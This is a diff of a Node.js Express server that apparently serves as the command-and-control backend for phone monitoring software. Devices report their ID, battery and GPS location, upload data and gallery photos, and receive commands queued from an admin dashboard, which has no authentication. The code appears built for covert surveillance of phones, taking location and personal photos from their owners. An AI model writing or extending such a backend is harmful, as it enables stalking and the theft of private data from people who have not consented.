@@ -7,6 +7,7 @@ const bodyParser = require('body-parser');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Storage Setup
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
@@ -15,21 +16,25 @@ app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(express.static(__dirname));
 
+// Live RAM Memory
 let devicesStatus = {}; 
 
-// --- 1. ADMIN: Get All Devices (Ye miss tha, isliye dashboard khali tha) ---
+// --- 1. DASHBOARD LIST FIX (Ye naya hai, baaki sab purana hai) ---
 app.get('/api/admin/all-devices', (req, res) => {
     res.json(devicesStatus);
 });
 
-// --- 2. PHONE SIDE: Update Status & Get Commands ---
+// --- PHONE SIDE API ---
 app.post('/api/status', (req, res) => {
     let { device_id, model, battery, version, charging, lat, lon } = req.body;
     if (!device_id) return res.status(400).json({ error: "No ID provided" });
 
     const id = device_id.toString().trim().toUpperCase();
+
+    // Command check
     const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";
 
+    // Update RAM
     devicesStatus[id] = {
         ...devicesStatus[id], 
         id: id,
@@ -40,30 +45,12 @@ app.post('/api/status', (req, res) => {
         lat: lat || devicesStatus[id]?.lat || 0,
         lon: lon || devicesStatus[id]?.lon || 0,
         lastSeen: Date.now(),
-        command: "none" // Command pick hone ke baad reset
+        command: "none" // Reset after pickup
     };
 
     res.json({ status: "success", command: pendingCommand });
 });
 
-// --- 3. ADMIN: Send Command (Sound Fix Included) ---
-app.post('/api/send-command', (req, res) => {
-    let { device_id, command } = req.body;
-    if (!device_id || !command) return res.status(400).json({ error: "Missing ID or Command" });
-    
-    const id = device_id.toUpperCase().trim();
-    if (!devicesStatus[id]) devicesStatus[id] = { id: id };
-    
-    // SOUND FIX: Agar dashboard 'normal' bhejta hai, toh use 'loud' mein badal do taaki Android samajh sake
-    let finalCommand = command;
-    if (command === "normal") finalCommand = "loud";
-
-    devicesStatus[id].command = finalCommand;
-    console.log(`🚀 [CMD] ${finalCommand} -> ${id}`);
-    res.json({ status: "success" });
-});
-
-// --- 4. UPLOAD DATA HANDLING ---
 app.post('/api/upload_data', (req, res) => {
     let { device_id, type, data } = req.body;
     if (!device_id) return res.status(400).json({ error: "No ID" });
@@ -116,8 +103,24 @@ app.post('/api/upload_gallery', (req, res) => {
         fs.writeFileSync(filePath, JSON.stringify(galleryData.slice(0, 50), null, 2));
         res.json({ status: "success" });
     } catch (error) {
-        res.status(500).json({ error: "error" });
+        res.status(500).json({ error: "Failed to save photo" });
     }
+});
+
+// --- ADMIN API ---
+app.post('/api/send-command', (req, res) => {
+    let { device_id, command } = req.body;
+    if (!device_id || !command) return res.status(400).json({ error: "Missing ID or Command" });
+    
+    const id = device_id.toUpperCase().trim();
+    if (!devicesStatus[id]) devicesStatus[id] = { id: id };
+    
+    // SOUND FIX: Agar dashboard "normal" bheje, toh use "loud" kar do phone ke liye
+    let finalCommand = (command === "normal") ? "loud" : command;
+
+    devicesStatus[id].command = finalCommand;
+    console.log(`🚀 [CMD] ${finalCommand} -> ${id}`);
+    res.json({ status: "success" });
 });
 
 app.get('/api/get-data/:device_id/:type', (req, res) => {
